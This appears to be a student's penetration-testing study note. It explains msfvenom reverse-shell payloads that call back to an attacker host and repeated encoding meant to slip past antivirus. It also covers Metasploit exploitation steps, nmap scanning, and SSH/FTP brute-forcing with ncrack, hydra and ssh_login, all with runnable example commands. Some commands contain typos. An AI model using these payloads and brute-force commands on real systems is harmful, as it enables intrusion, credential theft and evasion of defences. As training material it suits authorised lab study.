# 4_Exploiting Systems

`msfvenom` is a powerful tool within the Metasploit Framework that can be used to generate custom payloads and exploits. It can bypass antivirus software and firewall protections. The basic syntax is `msfvenom -p [payload] [options] -f [format]`. Common payloads include `windows/meterpreter/reverse_tcp` and `linux/x86/meterpreter/reverse_tcp`. The payload can be customized using options such as LHOST, LPORT, encoder, and output file name. It is important to have a good understanding of the target system and to use the payload responsibly and ethically.

### `msfvenom -p windows/meterpreter/reverse_tc LHOST=172.30.1.36 LPORT=4444 - f exe -o payload1.exe`

This command generates a payload with the `windows/meterpreter/reverse_tcp` payload and sets the LHOST to `172.30.1.36` and LPORT to `4444`. The payload is then output to an executable file with the name `payload1.exe` using the `-o` option. The format of the output file is specified using the `-f` option, which in this case is set to `exe`. This payload can then be used in a Metasploit attack against a target machine. It is important to note that using such tools and payloads for unauthorized purposes is illegal and can lead to severe consequences.

`payload1.exe`  contains a payload that can be used to exploit a vulnerable target system. In this case, the payload is designed to create a reverse TCP connection to the attacker's machine.

The `windows/meterpreter/reverse_tcp` payload is a type of payload that can be used to establish a connection between the attacker's machine and the target machine. Once the connection is established, the attacker can gain remote access to the target machine and execute commands on it.

It is important to note that using such tools and payloads for unauthorized purposes is illegal and can lead to severe consequences. It is essential to have a good understanding of the target system and to use the payload responsibly and ethically.

## VirusTotal

[VirusTotal](https://www.virustotal.com/gui/home/upload) is a free online service to scan files for malware using multiple antivirus engines simultaneously. It provides a report listing which antivirus engines detected the file as malware, along with other metadata. VirusTotal is useful for quick analysis of suspicious files, but it should not be relied upon as the sole source of information. It is commonly used by cybersecurity professionals and researchers.

We will try the generated .exe files againts different antiviruses using VirusTotal and see how to make our payload more legitimate each time. 

### `msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.30.1.36 LPORT=4444 -f exe -o payload2.exe -e Ã—86/shikata_ga_nai -i 9`

This command uses the `msfvenom` tool to generate a payload that can be used to exploit a vulnerable Windows system. The payload is designed to create a reverse TCP connection to the attacker's machine, which allows the attacker to gain remote access to the target machine and execute commands on it. The `LHOST` and `LPORT` options specify the attacker's IP address and port number, respectively, which are used to establish the connection. The `-f` option specifies the format of the output file, which in this case is an executable file (`exe`). The `-o` option specifies the name of the output file (`payload2.exe`).

The `-e` option specifies the encoder to use, which in this case is `x86/shikata_ga_nai`. An encoder is used to modify the payload in a way that makes it more difficult for antivirus software to detect it as malicious. The `x86/shikata_ga_nai` encoder is a common encoder that is known to be effective at bypassing antivirus software.

The `-i` option is used to specify the number of times to encode the payload. By encoding the payload multiple times, it becomes even more difficult for antivirus software to detect it as malicious. However, it is important to note that using such tools and payloads for unauthorized purposes is illegal and can lead to severe consequences. It is also important to note that using such tools and payloads should only be done by experts who understand the potential consequences and use them responsibly and ethically.

More legitimate, but still detectable with anti virus. Lets try another code

### `msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.30.1.20 LPORT=4444 -f exe -o payload3.exe -e X86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/whoami.exe`

The second code improves upon the first by adding a `-x` option, which specifies an existing execut  able file to use as a template for the payload. In this case, the `whoami.exe` file from the `/usr/share/windows-binaries` directory is used as the template. By using an existing executable file as a template, the resulting payload appears more legitimate and is less likely to be detected as malware by antivirus software. However, it is still important to use such tools and payloads responsibly and ethically, and to understand the potential consequences of using them for unauthorized purposes.

## Exploiting a vulnerable system

1. The `map -sn <ip> --exclude <ip>` command is a part of Nmap, a popular network exploration and security auditing tool. It is used to perform a ping scan on a specified IP address (`<ip>`) and exclude a specified IP address (`--exclude <ip>`) from the scan. A ping scan is a type of scan that sends an ICMP echo request to a host to check if it is online. The `--exclude` option is used to exclude a specific IP address from the scan. This can be useful in situations where you want to scan a range of IP addresses but want to exclude a particular IP address from the scan.
2. `nmap -A <ip>` is an aggressive scan command used to perform comprehensive testing on a target system including OS detection, version detection, script scanning, and traceroute. The `-A` option is used to enable aggressive mode. It is important to use such tools and techniques responsibly and ethically, as aggressive scanning can be detected by IDS and can potentially disrupt network traffic.
3. find sevice and its version, then find its vulnerabilities on the google. 
4. Then do the following
    
    To use `msfconsole` in the Metasploit Framework, follow these steps:
    
    1. Open a terminal and type `msfconsole` to launch the Metasploit Framework console.
    2. Use the `search` command to search for exploits or payloads related to your target. For example, `search windows 7` will return a list of exploits and payloads for Windows 7.
    3. Use the `use` command to select an exploit or payload. For example, `use exploit/windows/smb/ms08_067_netapi` will select the MS08-067 exploit for Windows systems.
    4. Use the `set` command to set the required options for the exploit or payload. For example, `set RHOST 192.168.1.1` will set the remote host to 192.168.1.1.
    5. Use the `run` command to execute the exploit or payload. For example, `run` will execute the selected exploit or payload.
    
    It is important to use such tools and techniques responsibly and ethically, and to understand the potential consequences of using them for unauthorized purposes.
    

# Performing Passwrod-Based Attacks

## Methods

Here's a shorter version of the text, presented as a numbered list:

1. Brute force
2. Dictionary
3. Password guessing
4. Password spraying
5. Credential stuffing
6. Online password attack
7. Offline password attack

Password-based attacks are commonly used by attackers to gain access to a system or network. Each attack uses a different method to try to guess or crack passwords. It is important to note that performing password-based attacks without permission is illegal and can lead to severe consequences. Always use such tools and techniques responsibly and ethically, and understand the potential consequences of using them for unauthorized purposes.

### Online Password Attacks

- In an online Password Attack, the threat actor attempts to gain unauthorized access
to a host that is running a network service.
- This attack allows unauthorized users to log into the system across a network.
- A simple example of an Online Password Attack is a threat actor attempting to
retrieve the username and password of a valid user to gain access to a server that is running Remote Desktop Protocol (RDP).

### Offline Password Attacks

- In an Offline Password Attack, the threat actor uses various tools and techniques to retrieve the valid password of a password-protected file, such as a document or even the cryptographic hash of a user's password.
- A simple example is capturing a domain administrator's username and password hash from network packets. The username is usually in plaintext, but you may need to retrieve the password from the hash value

### Brute Force

- In a brute force attack, every possible combination is tried against the system.
- This is a very time-consuming process as every possible password combination is tested against the authentication system of the target until the valid password is retrieved.

### Dictionary

- In a dictionary attack, the threat actor uses a pre-defined wordlist that contains thousands or even millions of possible passwords.
- These are then tested against the authentication system of the target. Each word from the wordlist is tested; however, the attack will not be successful if a valid password is not found within the wordlist being used by the threat actor.

### Password Guessing

- This is a common technique that's used by many people, even threat actors and penetration testers, who are attempting to gain unauthorized access to a system.

### Password Spraying

- This is the technique where a threat actor uses a single password and test it against an authentication svstem with different usernames.
The idea is to test which user account within a specific list that uses the same password.
- This technique is good when testing which users within the organization's network use weak or common passwords.

### Credential Stuffing

- This technique allows a threat actor to use a common wordlist of usernames and
passwords against the authentication system of a target host.
- This technique checks which combination of usernames and passwords are valid
credentials.

## Practice

- `nmap -sn <ip>` is a command used in Nmap, a network exploration and security auditing tool. It performs a ping scan on a specified IP address (`<ip>`) to check if it's online.
- `nmap -p <port> <ip>` performs a port scan on a specified IP address and port number to check which ports are open and listening for incoming connections. This information can be useful for identifying potential vulnerabilities. It is important to use such tools and techniques responsibly and ethically, and to understand the potential consequences of using them for unauthorized purposes.
- `nmap -O <ip>` is a command in Nmap that performs operating system detection on a specified IP address (`<ip>`). This information can be useful for identifying potential vulnerabilities and determining the appropriate attack techniques to use against the target host. Always use such tools and techniques responsibly and ethically, and understand the potential consequences of using them for unauthorized purposes.
- `ncrack` is a password cracking tool that automates brute-force attacks on network services like SSH, Telnet, FTP, HTTP, and more. Its basic syntax is `ncrack [options] <target>`. Common options include `-U` and `-P` for username and password files, respectively, and `-p` for the port number to target. Remember to use such tools ethically and responsibly, and understand the potential consequences of using them for unauthorized purposes. For example, `ncrack -U usernames.txt -P passwords.txt -p 22 192.168.1.1` would target port 22 on IP address `192.168.1.1` for SSH brute-forcing using the usernames in `usernames.txt` and passwords in `passwords.txt`.
    
    Some common options for the `ncrack` command include:
    
    - `U`: Specify a username file for brute-force attacks
    - `P`: Specify a password file for brute-force attacks
    - `p`: Specify a port to target
    - `v`: Verbose output
    - `T`: Set the number of threads to use
    - `o`: Output format and file name
    - `f`: Stop on first valid authentication found
    - `U, --user <user>`: Set a single username to use for authentication
    - `V, --version`: Display the version of `ncrack`
    - `h, --help`: Display help message

- `hydra` is a command-line tool used for brute-force attacks on network services. Its basic syntax is `hydra -l <username> -P <password list> <target service> <target IP>`. The `-l` option specifies the username to use for authentication, the `-P` option specifies the password file to use for brute-force attacks, the target service specifies the type of service to attack (e.g. `ssh`, `ftp`, `http-post-form`, etc.), and the target IP specifies the IP address of the target host.
    
    Some common options for the `hydra` command include:
    
    - `t`: Set the number of threads to use
    - `vV`: Verbose output
    - `o`: Output format and file name
    - `f`: Stop on first valid authentication found
    - `e nsr`: Specify which error messages to ignore (n=no response, s=connection refused, r=connection reset)
    
    Remember to use such tools ethically and responsibly, and understand the potential consequences of using them for unauthorized purposes.
    
    For example, `hydra -l admin -P passwords.txt ftp 192.168.1.1` would target the FTP service running on IP address `192.168.1.1`, using the username `admin` and passwords found in the file `passwords.txt`.
    

# Cracking SSH Access

- `nmap -sn <ip>` checks if the specified IP address (`<ip>`) is online, without performing a port scan. This can be useful for identifying active hosts on a network without generating network traffic that could be detected by IDS or firewalls. Note that using such tools and techniques for unauthorized purposes is illegal and can lead to severe consequences.
- `nmap -p <ip>` performs a port scan on a specified IP address and port number to check which ports are open and listening for incoming connections. This information can be useful for identifying potential vulnerabilities. It is important to use such tools and techniques responsibly and ethically, and to understand the potential consequences of using them for unauthorized purposes.
- To search for SSH login commands in `msfconsole` in the Metasploit Framework, follow these steps:
    1. Open a terminal and type `msfconsole` to launch the Metasploit Framework console.
    2. Use the `search` command to search for modules related to SSH login. For example, `search ssh_login` or `search ssh_login_pubkey` will return a list of modules for SSH login.
    3. Use the `use` command to select a module. For example, `use auxiliary/scanner/ssh/ssh_login` will select the SSH login scanner module.
    4. Use the `set` command to set the required options for the module. For example, `set RHOSTS 192.168.1.1` will set the remote host to 192.168.1.1. Other options may include `USERNAME`, `PASSWORD`, and `THREADS`.
    5. Use the `run` command to execute the module. For example, `run` will execute the selected SSH login scanner module.
    
    It is important to use such tools and techniques responsibly and ethically, and to understand the potential consequences of using them for unauthorized purposes.